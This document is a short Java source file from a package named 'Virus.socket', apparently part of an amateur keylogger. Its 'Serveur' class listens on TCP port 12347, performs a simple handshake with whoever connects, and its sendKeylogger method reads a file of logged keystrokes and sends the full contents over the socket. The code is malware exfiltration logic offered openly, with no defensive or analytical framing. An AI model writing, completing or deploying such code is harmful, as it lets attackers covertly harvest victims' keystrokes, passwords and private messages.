package Virus.socket;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class Serveur {
	private ServerSocket srsk;
	private Socket skt;

	public Serveur() {
		try {
			srsk = new ServerSocket(12347);
			skt = srsk.accept();
			
			skt.setKeepAlive(true);
			System.out.println("Connexion réussie");
			PrintWriter out = new PrintWriter(skt.getOutputStream(), true);
			out.println("Connect"+"\r\n");
			
			Thread.sleep(1000);

			BufferedReader in = new BufferedReader(new InputStreamReader(skt.getInputStream()));
			while (!in.ready()) {}
			if (in.readLine().equals("tree"));
				out.println("tree accept"+"\r\n");

			
		}
		catch(Exception e) {
			e.printStackTrace();
			System.out.println("Erreur de connexion server");
		}
		
		
		
		
	}
	public void sendKeylogger(File file) {
		String str;
		try {
			FileReader fr = new FileReader(file);
			str = "";
		    int i = 0;
		    while((i = fr.read()) != -1)
		        str += (char)i;
		    PrintWriter out = new PrintWriter(skt.getOutputStream(), true);
			out.println(str);
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
}
